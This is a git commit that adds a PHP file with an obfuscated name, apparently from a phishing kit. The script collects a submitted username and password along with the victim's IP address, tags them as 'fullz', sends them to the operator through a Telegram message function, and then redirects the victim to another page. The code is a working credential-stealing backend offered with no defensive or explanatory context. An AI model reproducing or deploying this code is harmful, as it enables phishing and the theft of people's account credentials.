eed417d3e2afc0a017bd9f82045b3affabe14bed
unknown <mayslaw47@gmail.com>
2022-07-23 07:14:45 -0700

    make it better

---
+++ 367199564b656eb802f4bb31c5e47f87/_=-+.php
@@ -0,0 +1,17 @@
+<?php
+include '../blocker.php';
+include 'config.php';
+$ip = getenv("REMOTE_ADDR");
+$message .= "Eeddd.-ca Username: " .$_POST['1']."\n\n";
+$message .= "Password: " .$_POST['2']."\n\n";
+$message .= "--------Eeddd---fullz--------------------\n";
+$message .= "Client IP : ".$ip."\n";
+$message .= "HostName : ".$hostname."\n";
+$rnessage = "$message\n";
+$message .= "--------Eeddd.-ca------\n";
+$subject = "Eeddd Email And Password-Edd\r\n\r\n".$message;
+send_telegram_msg($message);
+header("Location: _+_==+==_+.htm");
+
+?>
+        
